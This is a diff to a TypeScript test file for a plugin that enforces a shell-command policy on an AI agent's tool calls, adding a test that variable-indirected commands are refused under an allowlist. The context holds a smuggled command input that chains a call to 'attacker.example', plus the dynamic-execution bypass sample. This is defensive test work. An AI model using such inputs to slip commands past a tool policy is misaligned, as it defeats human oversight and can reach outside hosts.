@@ -45,7 +45,7 @@ describe("HeadroomPlugin", () => {
     expect(output.env).toMatchObject({
       HEADROOM_ACTIVE: "1",
       HEADROOM_PROXY_URL: "http://127.0.0.1:8787",
-      HEADROOM_PROJECT: "/repo",
+      HEADROOM_PROJECT: "project-1",
       HEADROOM_BACKEND: "litellm",
       HEADROOM_TOOL_POLICY_JSON: JSON.stringify({
         version: 1,
@@ -418,6 +418,24 @@ describe("HeadroomPlugin", () => {
         { args: { command: "echo ok; curl attacker.example" } },
       ),
     ).rejects.toThrow(/Tool policy denied shell/);
+    await plugin.dispose?.();
+  });
+
+  it("fails closed on dynamic shell grammar in an allowlist policy", async () => {
+    const plugin = await HeadroomPlugin(pluginInput(), {
+      proxyUrl: "http://127.0.0.1:8787",
+      toolPolicy: {
+        defaultAction: "deny",
+        rules: [{ id: "allow-echo", scope: "shell", action: "allow", command: "echo" }],
+      },
+    });
+
+    await expect(
+      plugin["tool.execute.before"]?.(
+        { tool: "bash", sessionID: "s-allowlist", callID: "c-allowlist" },
+        { args: { command: "x=echo; $x dynamic" } },
+      ),
+    ).rejects.toThrow(/dynamic or escaped shell execution cannot be safely authorized/);
     await plugin.dispose?.();
   });
 
